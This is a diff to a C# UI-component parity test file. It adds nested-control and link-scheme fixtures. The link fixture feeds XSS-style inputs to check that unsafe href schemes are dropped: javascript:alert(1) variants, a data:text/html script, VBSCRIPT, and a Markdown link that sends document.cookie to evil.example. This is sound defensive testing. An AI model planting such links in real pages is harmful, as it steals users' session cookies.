@@ -85,6 +85,10 @@ public class ComponentParityFixtureTests
         // A picture of a DISABLED control: both producers mask the control's states for its subtree.
         ("control-states-disabled-simulated",
             new Simulated(SimulatedState.Pressed | SimulatedState.Focused, DisabledControlStates()), NoPresses),
+        // A picture of a control holding another (#616): both producers picture the OUTER one, and the
+        // inner control's boxes keep their real focus and press rules, as a real press stops there.
+        ("nested-control-simulated",
+            new Simulated(SimulatedState.Pressed | SimulatedState.Focused, NestedControlStates()), NoPresses),
         // A draggable resting OPEN over a box with its own transform, a colour fade and a hover that
         // lifts it (#511): the offset rides `translate` on both producers, beside the box's
         // `transform`, and its glide joins the box's transition list instead of replacing it.
@@ -230,6 +234,27 @@ public class ComponentParityFixtureTests
         // chevrons come first in tree order — so this picks July 1st over the 17th.
         ("calendar-picks-a-day", new eQuantic.UI.Components.Calendar(new DateOnly(2026, 7, 17)), [2]),
 
+        // LINKS AND THEIR SCHEMES (#1286): a Link, a run that links and a Markdown link carry a destination
+        // whose scheme an href may carry, and write none for any other, folded as a browser folds it.
+        ("links-with-schemes", Stack(Space.S2,
+            new Link("javascript:alert(1)", new Text("script", TypeRole.BodyM, Theme.TextPrimary)),
+            new Link(" JaVa\tScRiPt:alert(1)", new Text("folded", TypeRole.BodyM, Theme.TextPrimary)),
+            new Link("mailto:team@example.com", new Text("mail", TypeRole.BodyM, Theme.TextPrimary)),
+            new Text("", TypeRole.BodyM, Theme.TextPrimary)
+            {
+                Spans =
+                [
+                    new TextRun("data") { Destination = "data:text/html,<script>alert(1)</script>" },
+                    new TextRun("vb") { Destination = "VBSCRIPT:msgbox" },
+                    new TextRun("call") { Destination = "tel:+351210000000" },
+                    new TextRun("web") { Destination = "HTTPS://example.com" },
+                    new TextRun("here") { Destination = "#top" },
+                    new TextRun("next") { Destination = "docs/next?page=2" },
+                ],
+            },
+            new Markdown("[click](javascript:location='//evil.example/?'+document.cookie) and [docs](https://example.com/docs)")),
+            NoPresses),
+
         // LINKS UNDER A LANGUAGE (LinkLanguages): a Link and a run that links each carry the active
         // language on an app-internal href and warm it on hover, and leave somebody else's alone,
         // a protocol-relative one included. The run took its destination as written (#505).
@@ -362,7 +387,8 @@ public class ComponentParityFixtureTests
     }
 
     /// <summary>The control of the control-states cases: a raised surface with a hover, a focus and a
-    /// press, each changing what the others do not, and the pressed fill it has always had.</summary>
+    /// press, each changing what the others do not, and the pressed fill it has always had, in its
+    /// own Pressed diff since #616.</summary>
     private static Pressable ControlStates() => new(new Box(new BoxStyle
     {
         Width = 40,
@@ -371,16 +397,24 @@ public class ComponentParityFixtureTests
         Elevation = 2,
         Hover = new StyleDiff { Elevation = 3 },
         Focus = new StyleDiff { BorderColor = Theme.FocusRing, BorderWidth = 2, Opacity = 0.95f },
-        Pressed = new StyleDiff { Transform = Transform2D.Scale(0.985f), Elevation = 1 },
-    }), () => { })
+        Pressed = new StyleDiff
+        {
+            Transform = Transform2D.Scale(0.985f), Elevation = 1, Background = Theme.SurfaceSubtle,
+        },
+    }), () => { });
+
+    private static Pressable NestedControlStates() => new(new Box(new BoxStyle
     {
-        PressedBackground = Theme.SurfaceSubtle,
-    };
+        Width = 80,
+        Height = 48,
+        Background = Theme.Surface,
+        Focus = new StyleDiff { Opacity = 0.9f },
+        Pressed = new StyleDiff { Background = Theme.SurfaceSubtle },
+    }, ControlStates()), () => { });
 
     private static Pressable DisabledControlStates() => new(ControlStates().Child, () => { })
     {
         Disabled = true,
-        PressedBackground = Theme.SurfaceSubtle,
     };
 
     private static eQuantic.UI.Spreadsheets.Spreadsheet Sheet()
@@ -540,7 +574,7 @@ public class ComponentParityFixtureTests
                 var once = UnmeasuredMark.Replace(
                     HtmlRenderer.RenderNode(WebRealizer.Lower(drawnOnce, Theme, 1f, new StyleSink()).Render()), "");
 
-                var owner = new BuildOwner();
+                var owner = ComponentBoundary.Owner();
                 var root = owner.Build(framed, new ComponentContext(Theme, 1f, Density.Comfortable, static (_, _) => 0f),
                     sizeClass, rebuildAll: false);
                 var frame = HtmlRenderer.RenderNode(WebRealizer.LowerFrame(root, Theme, 1f, new StyleSink()).Render());
